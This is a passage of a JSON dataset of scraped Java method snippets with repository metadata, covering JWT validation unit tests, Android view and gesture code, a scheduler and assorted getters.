30946, "method_name": "testReturnFalseWhenJWThasInvalidSignature", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testReturnFalseWhenJWThasInvalidSignature() {\n        boolean isTokenValid = tokenProvider.validateToken(createTokenWithDifferentSignature());\n\n        assertThat(isTokenValid).isEqualTo(false);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30947, "method_name": "testReturnFalseWhenJWTisMalformed", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testReturnFalseWhenJWTisMalformed() {\n        Authentication authentication = createAuthentication();\n        String token = tokenProvider.createToken(authentication, false);\n        String invalidToken = token.substring(1);\n        boolean isTokenValid = tokenProvider.validateToken(invalidToken);\n\n        assertThat(isTokenValid).isEqualTo(false);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30948, "method_name": "testReturnFalseWhenJWTisExpired", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testReturnFalseWhenJWTisExpired() {\n        ReflectionTestUtils.setField(tokenProvider, \"tokenValidityInMilliseconds\", -ONE_MINUTE);\n\n        Authentication authentication = createAuthentication();\n        String token = tokenProvider.createToken(authentication, false);\n\n        boolean isTokenValid = tokenProvider.validateToken(token);\n\n        assertThat(isTokenValid).isEqualTo(false);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30949, "method_name": "testReturnFalseWhenJWTisUnsupported", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testReturnFalseWhenJWTisUnsupported() {\n        String unsupportedToken = createUnsupportedToken();\n\n        boolean isTokenValid = tokenProvider.validateToken(unsupportedToken);\n\n        assertThat(isTokenValid).isEqualTo(false);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30950, "method_name": "testReturnFalseWhenJWTisInvalid", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testReturnFalseWhenJWTisInvalid() {\n        boolean isTokenValid = tokenProvider.validateToken(\"\");\n\n        assertThat(isTokenValid).isEqualTo(false);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30951, "method_name": "createAuthentication", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Authentication", "snippet": "    private Authentication createAuthentication() {\n        Collection<GrantedAuthority> authorities = new ArrayList<>();\n        authorities.add(new SimpleGrantedAuthority(AuthoritiesConstants.ANONYMOUS));\n        return new UsernamePasswordAuthenticationToken(\"anonymous\", \"anonymous\", authorities);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30952, "method_name": "createUnsupportedToken", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String createUnsupportedToken() {\n        return Jwts.builder()\n            .setPayload(\"payload\")\n            .signWith(key, SignatureAlgorithm.HS512)\n            .compact();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30953, "method_name": "createTokenWithDifferentSignature", "class_name": "TokenProviderTest", "params": [], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String createTokenWithDifferentSignature() {\n        Key otherKey = Keys.hmacShaKeyFor(Decoders.BASE64\n            .decode(\"Xfd54a45s65fds737b9aafcb3412e07ed99b267f33413274720ddbb7f6c5e64e9f14075f2d7ed041592f0b7657baf8\"));\n\n        return Jwts.builder()\n            .setSubject(\"anonymous\")\n            .signWith(otherKey, SignatureAlgorithm.HS512)\n            .setExpiration(new Date(new Date().getTime() + ONE_MINUTE))\n            .compact();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/security/jwt/TokenProviderTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30954, "method_name": "getMaxLineWidth", "class_name": "HorizontalScroller", "params": ["TextView"], "throws": null, "modifiers": ["private", "final", "static"], "return_type": "int", "snippet": "    private static final int getMaxLineWidth(TextView textView) {\n        Layout layout = textView.getLayout();\n        if (layout != null) {\n            int lineCount = layout.getLineCount();\n            float max = 0;\n            for (int i = 0; i < lineCount; i++) {\n                float lineWidth = layout.getLineWidth(i);\n                max = Math.max(max, lineWidth);\n            }\n            return (int) max;\n        } else {\n            return 0;\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/htmlwidget/HorizontalScroller.java", "stars": "74", "class_props": {"extends": "HorizontalScrollView", "implements": null, "modifiers": ["public"]}}, {"id": 30955, "method_name": "measureChild", "class_name": "HorizontalScroller", "params": ["View", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void measureChild(View child, int parentWidthMeasureSpec, int parentHeightMeasureSpec) {\n        ViewGroup.LayoutParams lp = child.getLayoutParams();\n\n        int childWidthMeasureSpec = getChildMeasureSpec(parentWidthMeasureSpec, getPaddingLeft()\n                + getPaddingRight(), lp.width);\n        int childHeightMeasureSpec = getChildMeasureSpec(parentHeightMeasureSpec, getPaddingTop()\n                + getPaddingBottom(), lp.height);\n\n        child.measure(childWidthMeasureSpec, childHeightMeasureSpec);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/htmlwidget/HorizontalScroller.java", "stars": "74", "class_props": {"extends": "HorizontalScrollView", "implements": null, "modifiers": ["public"]}}, {"id": 30956, "method_name": "measureChildWithMargins", "class_name": "HorizontalScroller", "params": ["View", "int", "int", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void measureChildWithMargins(View child, int parentWidthMeasureSpec, int widthUsed,\n            int parentHeightMeasureSpec, int heightUsed) {\n        MarginLayoutParams lp = (MarginLayoutParams) child.getLayoutParams();\n\n        int childWidthMeasureSpec = getChildMeasureSpec(parentWidthMeasureSpec, getPaddingLeft()\n                + getPaddingRight() + lp.leftMargin + lp.rightMargin + widthUsed, lp.width);\n        int childHeightMeasureSpec = getChildMeasureSpec(parentHeightMeasureSpec, getPaddingTop()\n                + getPaddingBottom() + lp.topMargin + lp.bottomMargin + heightUsed, lp.height);\n\n        child.measure(childWidthMeasureSpec, childHeightMeasureSpec);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/htmlwidget/HorizontalScroller.java", "stars": "74", "class_props": {"extends": "HorizontalScrollView", "implements": null, "modifiers": ["public"]}}, {"id": 30957, "method_name": "onLayout", "class_name": "HorizontalScroller", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onLayout(boolean changed, int left, int top, int right, int bottom) {\n        super.onLayout(changed, left, top, right, bottom);\n\n        int count = getChildCount();\n        for (int i = 0; i < count; i++) {\n            View child = getChildAt(i);\n            int visibility = child.getVisibility();\n            if (visibility != GONE && child instanceof TextView) {\n                int childLeft = child.getLeft();\n                int childTop = child.getTop();\n                int childRight = child.getRight();\n                int childBottom = child.getBottom();\n\n                int padding = child.getPaddingLeft() + child.getPaddingRight();\n                int maxLineWidth = getMaxLineWidth((TextView) child);\n                int preferredRight = childLeft + maxLineWidth + padding;\n\n                if (childRight < preferredRight) {\n                    child.layout(childLeft, childTop, preferredRight, childBottom);\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/htmlwidget/HorizontalScroller.java", "stars": "74", "class_props": {"extends": "HorizontalScrollView", "implements": null, "modifiers": ["public"]}}, {"id": 30958, "method_name": "clone", "class_name": "MaximalRepeat", "params": ["Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void clone(Substring other) {\n\t\tsuper.clone(other);\n\t\tMaximalRepeat mr = (MaximalRepeat)other;\n\t\tmr.leftContext=leftContext;\n\t\tmr.isLeftExtensionOfMaximalRepeat=isLeftExtensionOfMaximalRepeat;\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/MaximalRepeat.java", "stars": "2", "class_props": {"extends": "RightMaximalSubstring", "implements": null, "modifiers": ["public"]}}, {"id": 30959, "method_name": "getInstance", "class_name": "MaximalRepeat", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Substring", "snippet": "\tprotected Substring getInstance() {\n\t\treturn new MaximalRepeat(alphabetLength,log2alphabetLength,bitsToEncodeAlphabetLength,bwtLength,log2BWTLength,bitsToEncodeBWTLength);\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/MaximalRepeat.java", "stars": "2", "class_props": {"extends": "RightMaximalSubstring", "implements": null, "modifiers": ["public"]}}, {"id": 30960, "method_name": "getEpsilon", "class_name": "MaximalRepeat", "params": ["long"], "throws": null, "modifiers": ["protected"], "return_type": "Substring", "snippet": "\tprotected Substring getEpsilon(long[] C) {\n\t\tMaximalRepeat out = (MaximalRepeat)getInstance();\n\n\t\t// $bwtIntervals$\n\t\tout.nIntervals=alphabetLength+1;\n\t\tout.bwtIntervals[0][0]=0;  // $#$\n\t\tout.bwtIntervals[0][1]=0;\n\t\tfor (int i=0; i<alphabetLength-1; i++) {  // Other characters\n\t\t\tout.bwtIntervals[i+1][0]=C[i];\n\t\t\tout.bwtIntervals[i+1][1]=C[i+1]-1;\n\t\t}\n\t\tout.bwtIntervals[alphabetLength][0]=C[alphabetLength-1];\n\t\tout.bwtIntervals[alphabetLength][1]=bwtLength-1;\n\n\t\t// Other variables\n\t\tout.address=-1;\n\t\tout.log2address=-1;\n\t\tout.previousAddress=-1;\n\t\tout.length=0;\n\t\tout.log2length=-1;\n\t\tout.bitsToEncodeLength=1;\n\t\tout.firstCharacter=-1;\n\t\tout.hasBeenExtended=false;\n\t\tout.hasBeenStolen=false;\n\t\tout.computeRightContext();\n\t\tout.leftContext=-1;\n\t\tout.isLeftExtensionOfMaximalRepeat=false;\n\n\t\treturn out;\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/MaximalRepeat.java", "stars": "2", "class_props": {"extends": "RightMaximalSubstring", "implements": null, "modifiers": ["public"]}}, {"id": 30961, "method_name": "toString", "class_name": "MaximalRepeat", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\tString out = super.toString()+\" | \";\n\t\tout+=\"leftContext=\"+leftContext+\" \";\n\t\tout+=\"isLeftExtensionOfMaximalRepeat=\"+isLeftExtensionOfMaximalRepeat+\" \";\n\t\treturn out;\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/MaximalRepeat.java", "stars": "2", "class_props": {"extends": "RightMaximalSubstring", "implements": null, "modifiers": ["public"]}}, {"id": 30962, "method_name": "computeLeftContext", "class_name": "MaximalRepeat", "params": ["Substring"], "throws": null, "modifiers": ["final", "protected"], "return_type": "void", "snippet": "\tprotected final void computeLeftContext(Substring[] leftExtensions) {\n\t\tleftContext=0;\n\t\tfor (int i=0; i<alphabetLength+1; i++) {\n\t\t\tif (leftExtensions[i].frequency()>0) leftContext++;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/MaximalRepeat.java", "stars": "2", "class_props": {"extends": "RightMaximalSubstring", "implements": null, "modifiers": ["public"]}}, {"id": 30963, "method_name": "visited", "class_name": "MaximalRepeat", "params": ["Stream", "RigidStream", "SimpleStream", "Substring", "Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void visited(Stream stack, RigidStream characterStack, SimpleStream pointerStack, Substring[] cache, Substring[] leftExtensions) {\n\t\tsuper.visited(stack,characterStack,pointerStack,cache,leftExtensions);\n\n\t\t// Maximal repeat\n\t\tcomputeLeftContext(leftExtensions);\n\n\t\t// Left-extensions of maximal repeats\n\t\tif (leftContext>1) {\n\t\t\tMaximalRepeat mr;\n\t\t\tfor (int i=1; i<alphabetLength+1; i++) {  // Disregarding $#$\n\t\t\t\tmr=(MaximalRepeat)leftExtensions[i];\n\t\t\t\tif (leftExtensions[i].frequency()>0) mr.isLeftExtensionOfMaximalRepeat=true;\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/MaximalRepeat.java", "stars": "2", "class_props": {"extends": "RightMaximalSubstring", "implements": null, "modifiers": ["public"]}}, {"id": 30964, "method_name": "apply", "class_name": "Items", "params": ["Player", "VipType"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void apply(Player player, VipType type) {\n\n        if (!isPresent()) return;\n\n        for (ItemStack stack : getSection()) {\n            Stacks.give(player, stack);\n        }\n\n    }", "url": "https://raw.githubusercontent.com/devwckd/wckd-vips/master/src/main/java/co/wckd/vips/entity/section/Items.java", "stars": "2", "class_props": {"extends": "VipSection", "implements": null, "modifiers": ["public"]}}, {"id": 30965, "method_name": "onDown", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onDown (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onDown (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30966, "method_name": "n_onDown", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onDown (android.view.MotionEvent p0);\n\n\n\tpublic boolean onFling (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3)\n\t{\n\t\treturn n_onFling (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30967, "method_name": "onFling", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android", "android", "float", "float"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onFling (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3)\n\t{\n\t\treturn n_onFling (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30968, "method_name": "n_onFling", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android", "android", "float", "float"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onFling (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3);\n\n\n\tpublic void onLongPress (android.view.MotionEvent p0)\n\t{\n\t\tn_onLongPress (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30969, "method_name": "onLongPress", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onLongPress (android.view.MotionEvent p0)\n\t{\n\t\tn_onLongPress (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30970, "method_name": "n_onLongPress", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onLongPress (android.view.MotionEvent p0);\n\n\n\tpublic boolean onScroll (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3)\n\t{\n\t\treturn n_onScroll (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30971, "method_name": "onScroll", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android", "android", "float", "float"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onScroll (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3)\n\t{\n\t\treturn n_onScroll (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30972, "method_name": "n_onScroll", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android", "android", "float", "float"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onScroll (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3);\n\n\n\tpublic void onShowPress (android.view.MotionEvent p0)\n\t{\n\t\tn_onShowPress (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30973, "method_name": "onShowPress", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onShowPress (android.view.MotionEvent p0)\n\t{\n\t\tn_onShowPress (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30974, "method_name": "n_onShowPress", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onShowPress (android.view.MotionEvent p0);\n\n\n\tpublic boolean onSingleTapUp (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onSingleTapUp (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30975, "method_name": "onSingleTapUp", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onSingleTapUp (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onSingleTapUp (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30976, "method_name": "n_onSingleTapUp", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onSingleTapUp (android.view.MotionEvent p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30977, "method_name": "monodroidAddReference", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30978, "method_name": "monodroidClearReferences", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30979, "method_name": "getId", "class_name": "Attachment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Attachment.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30980, "method_name": "getFileSize", "class_name": "Attachment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getFileSize() {\n        return fileSize;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Attachment.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30981, "method_name": "getOwnerId", "class_name": "Attachment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getOwnerId() {\n        return ownerId;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Attachment.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30982, "method_name": "getSha512", "class_name": "Attachment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSha512() {\n        return sha512;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Attachment.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30983, "method_name": "initInternal", "class_name": "StandardScheduler", "params": [], "throws": ["LifecycleException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initInternal() throws LifecycleException {\n        initExecutors();\n        initLoadBalancer();\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/StandardScheduler.java", "stars": "3", "class_props": {"extends": "AbstractLifecycle", "implements": ["Scheduler"], "modifiers": ["public"]}}, {"id": 30984, "method_name": "startInternal", "class_name": "StandardScheduler", "params": [], "throws": ["LifecycleException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void startInternal() throws LifecycleException {\n        for (Executor<Task> executor : executors) {\n            executor.start();\n        }\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/StandardScheduler.java", "stars": "3", "class_props": {"extends": "AbstractLifecycle", "implements": ["Scheduler"], "modifiers": ["public"]}}, {"id": 30985, "method_name": "stopInternal", "class_name": "StandardScheduler", "params": [], "throws": ["LifecycleException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void stopInternal() throws LifecycleException {\n        for (Executor<Task> executor : executors) {\n            executor.stop();\n        }\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/StandardScheduler.java", "stars": "3", "class_props": {"extends": "AbstractLifecycle", "implements": ["Scheduler"], "modifiers": ["public"]}}, {"id": 30986, "method_name": "submit", "class_name": "StandardScheduler", "params": ["Task"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void submit(Task task) {\n        Executor<Task> executor = selectExecutor();\n        executor.execute(task);\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/StandardScheduler.java", "stars": "3", "class_props": {"extends": "AbstractLifecycle", "implements": ["Scheduler"], "modifiers": ["public"]}}, {"id": 30987, "method_name": "initExecutors", "class_name": "StandardScheduler", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initExecutors() {\n        int coreSize = Configs.getExecutorsCoreSize() == 0 ? Runtime.getRuntime().availableProcessors()\n                : Configs.getExecutorsCoreSize();\n        executors = new PriorityExecutor[coreSize];\n        for (int i = 0; i < coreSize; i++) {\n            executors[i] = new PriorityExecutor();\n            executors[i].init();\n        }\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/StandardScheduler.java", "stars": "3", "class_props": {"extends": "AbstractLifecycle", "implements": ["Scheduler"], "modifiers": ["public"]}}, {"id": 30988, "method_name": "initLoadBalancer", "class_name": "StandardScheduler", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initLoadBalancer() {\n        switch (Configs.getLoadBalanceType()) {\n        case WEIGHT_ROUND_ROBIN:\n            loadBalancer = new WeightRoundRobinLoadBalancer();\n            break;\n        default:\n            loadBalancer = new RoundRobinLoadBalancer();\n            break;\n        }\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/StandardScheduler.java", "stars": "3", "class_props": {"extends": "AbstractLifecycle", "implements": ["Scheduler"], "modifiers": ["public"]}}, {"id": 30989, "method_name": "selectExecutor", "class_name": "StandardScheduler", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Executor<Task>", "snippet": "    private Executor<Task> selectExecutor() {\n        return loadBalancer.select(executors);\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/StandardScheduler.java", "stars": "3", "class_props": {"extends": "AbstractLifecycle", "implements": ["Scheduler"], "modifiers": ["public"]}}, {"id": 30990, "method_name": "get", "class_name": "DefaultQuality", "params": ["Context", "List<String>"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String get(Context context, List<String> availableQualities) {\n        String quality = PrefUtils.get(context, Prefs.QUALITY_DEFAULT, \"720p\");\n        String[] fallbackOrder = new String[] {\"720p\", \"480p\", \"1080p\"};\n\n        if(availableQualities.indexOf(quality) == -1) {\n            for (String fallbackQuality : fallbackOrder) {\n                if (availableQualities.indexOf(fallbackQuality) != -1) {\n                    quality = fallbackQuality;\n                    break;\n                }\n            }\n        }\n\n        return quality;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/content/preferences/DefaultQuality.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30991, "method_name": "onDraw", "class_name": "Practice01DrawTextView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        // \u4f7f\u7528 drawText() \u6765\u7ed8\u5236\u6587\u5b57\n        // 